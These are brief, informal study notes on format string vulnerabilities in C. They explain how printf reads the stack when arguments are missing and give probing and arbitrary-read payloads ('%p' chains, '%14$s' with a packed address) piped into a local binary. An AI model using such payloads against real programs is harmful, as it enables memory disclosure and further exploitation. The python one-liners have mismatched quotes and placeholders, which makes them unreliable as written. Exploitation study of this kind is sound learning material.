useful technique


printf("aaa: %d", 1911)
aaa:format string
%d:format specifier
1911:argument

normally we do like these , pass on argument(value or address)
but if not do printf("") they just read address from stack ESP.

ESP is the current stack pointer. EBP is the base pointer for the current stack frame.

type
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
to show where the value(AAAA) is stored in stack

python -c \'print \x38\x85... (address) %14$s' | ./a.out (14th stack memory)
python3 -c "import sys;sys.stdout.buffer.write(b' same as above' )' | ./a.out

pick the 14th argument from the stack
then 14 th argument is \x38\x85... (address) then read target value
